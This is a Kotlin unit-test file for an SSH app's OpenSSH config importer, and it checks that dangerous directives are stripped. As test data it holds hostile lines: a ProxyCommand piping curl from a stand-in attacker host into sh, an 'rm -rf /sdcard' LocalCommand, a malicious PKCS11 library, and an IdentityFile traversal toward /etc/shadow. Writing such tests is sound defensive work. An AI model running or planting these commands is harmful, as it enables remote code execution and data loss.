package com.adamoutler.ssh.openssh

import com.adamoutler.ssh.data.AuthType
import com.adamoutler.ssh.data.ConnectionProfile
import com.adamoutler.ssh.data.IdentityProfile
import com.adamoutler.ssh.data.Protocol
import org.junit.Assert.*
import org.junit.Test
import java.io.ByteArrayInputStream

class OpenSshConfigImporterSecurityTest {

    @Test
    fun testStandardDirectivesParsing() {
        val config = """
            Host web-prod
                HostName 198.51.100.10
                User deploy
                Port 2200
                ServerAliveInterval 30

            Host *
                ServerAliveInterval 60
                User defaultuser
        """.trimIndent()

        val result = OpenSshConfigParser.parse(
            ByteArrayInputStream(config.toByteArray(Charsets.UTF_8)),
        )

        assertEquals(1, result.profiles.size)
        val profile = result.profiles.first()
        assertEquals("web-prod", profile.nickname)
        assertEquals("198.51.100.10", profile.host)
        assertEquals("deploy", profile.username)
        assertEquals(2200, profile.port)
        assertEquals(30, profile.keepAliveIntervalSeconds)
        assertEquals(Protocol.SSH, profile.protocol)
    }

    @Test
    fun testRceVectorNeutralization() {
        val maliciousConfig = """
            Host evil-target
                HostName 10.0.0.1
                ProxyCommand curl -s https://evil.attacker/payload | sh
                LocalCommand rm -rf /sdcard
                PermitLocalCommand yes
                PKCS11Provider /data/local/tmp/malicious.so
                Match exec "ping -c 1 evil.attacker"
                User root
        """.trimIndent()

        val result = OpenSshConfigParser.parse(
            ByteArrayInputStream(maliciousConfig.toByteArray(Charsets.UTF_8)),
        )

        // 1 host parsed, but all 5 malicious RCE directives MUST be stripped and logged
        assertEquals(1, result.profiles.size)
        val profile = result.profiles.first()
        assertEquals("evil-target", profile.nickname)
        assertEquals("10.0.0.1", profile.host)
        assertEquals("root", profile.username)

        // Verify sanitized directives contains the rejected execution vectors
        assertTrue(result.sanitizedDirectives.size >= 4)
        assertTrue(result.sanitizedDirectives.any { it.contains("proxycommand", ignoreCase = true) })
        assertTrue(result.sanitizedDirectives.any { it.contains("localcommand", ignoreCase = true) })
        assertTrue(result.sanitizedDirectives.any { it.contains("permitlocalcommand", ignoreCase = true) })
        assertTrue(result.sanitizedDirectives.any { it.contains("pkcs11provider", ignoreCase = true) })
    }

    @Test
    fun testPathTraversalNeutralizationOnIdentityFile() {
        val identity = IdentityProfile(
            id = "id_ed25519_uuid",
            name = "id_ed25519",
            username = "deploy",
            privateKey = ByteArray(32),
        )

        val traversalConfig = """
            Host secure-box
                HostName 192.168.1.50
                IdentityFile ../../../../../etc/shadow/id_ed25519
        """.trimIndent()

        val result = OpenSshConfigParser.parse(
            ByteArrayInputStream(traversalConfig.toByteArray(Charsets.UTF_8)),
            existingIdentities = listOf(identity),
        )

        assertEquals(1, result.profiles.size)
        val profile = result.profiles.first()
        assertEquals("secure-box", profile.nickname)
        // Traversal is stripped to "id_ed25519" and linked to existing identity
        assertEquals("id_ed25519_uuid", profile.identityId)
        assertEquals(AuthType.KEY, profile.authType)
    }

    @Test
    fun testProxyJumpResolutionAndCycleDetection() {
        val bastion = ConnectionProfile(
            id = "bastion_uuid",
            nickname = "bastion-corp",
            host = "bastion.example.com",
        )

        val config = """
            Host db-internal
                HostName 10.0.1.5
                ProxyJump bastion-corp

            Host app-internal
                HostName 10.0.1.6
                ProxyJump db-internal
        """.trimIndent()

        val result = OpenSshConfigParser.parse(
            ByteArrayInputStream(config.toByteArray(Charsets.UTF_8)),
            existingProfiles = listOf(bastion),
        )

        assertEquals(2, result.profiles.size)
        val dbProfile = result.profiles.find { it.nickname == "db-internal" }
        assertNotNull(dbProfile)
        assertEquals("bastion_uuid", dbProfile?.jumpHostProfileId)

        val appProfile = result.profiles.find { it.nickname == "app-internal" }
        assertNotNull(appProfile)
        assertEquals(dbProfile?.id, appProfile?.jumpHostProfileId)
    }

    @Test
    fun testMaxBoundsEnforcement() {
        // Build a config with 300 hosts (exceeding MAX_HOST_ENTRIES = 250)
        val sb = StringBuilder()
        for (i in 1..300) {
            sb.append("Host host-$i\n  HostName 10.0.0.$i\n")
        }

        val result = OpenSshConfigParser.parse(
            ByteArrayInputStream(sb.toString().toByteArray(Charsets.UTF_8)),
        )

        assertEquals(250, result.profiles.size)
        assertTrue(result.skippedHosts.size >= 50)
    }
}
